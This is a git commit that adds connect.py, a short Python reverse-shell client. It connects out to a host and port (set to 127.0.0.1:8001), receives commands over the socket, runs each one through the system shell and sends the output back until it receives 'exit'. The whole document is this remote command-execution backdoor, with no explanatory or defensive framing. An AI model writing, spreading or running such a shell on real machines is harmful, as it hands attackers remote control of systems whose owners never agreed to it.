c861c5a327bacc10a4672d8f789ca791458b10b5
Dex56811 <dex5681@protonmail.com>
2018-10-23 21:29:36 +0100

    barely working version, requires manual CTRL-C on clientside.

---
+++ connect.py
@@ -0,0 +1,23 @@
+import socket,subprocess
+
+host = '127.0.0.1'
+port = 8001
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+s.connect((host,port))
+
+while 1:
+	command = s.recv(1024)
+	command = command.decode('utf-8')
+
+	if command != "exit":
+		sh = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+
+		out, err = sh.communicate()
+
+		result = out + err
+		s.send(result)
+	else:
+		break
+s.close()
